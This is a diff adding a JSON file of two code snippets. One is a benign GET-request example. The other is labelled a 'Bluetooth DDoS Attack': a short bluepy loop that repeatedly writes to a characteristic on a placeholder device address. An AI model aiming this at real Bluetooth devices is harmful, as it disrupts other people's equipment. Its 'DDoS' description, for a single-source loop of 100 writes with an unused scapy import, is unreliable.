@@ -1,0 +1,24 @@
+{
+  "utm1": {
+    "title": "Bluetooth DDoS Attack",
+    "description": "This code demonstrates a basic Bluetooth DDoS attack using Python.",
+    "code": [
+      "from scapy.all import *",
+      "from bluepy.btle import Peripheral",
+      "peripheral = Peripheral('00:11:22:33:44:55')",
+      "for _ in range(100):",
+      "  peripheral.writeCharacteristic(0x15, b'Attack')"
+    ],
+    "additionalInfo": "This code targets a Bluetooth device."
+  },
+  "utm2": {
+    "title": "GET Request Example",
+    "description": "This code demonstrates how to send a GET request using Python.",
+    "code": [
+      "import requests",
+      "response = requests.get('https://example.com')",
+      "print(response.text)"
+    ],
+    "additionalInfo": "This code fetches content from a website."
+  }
+}
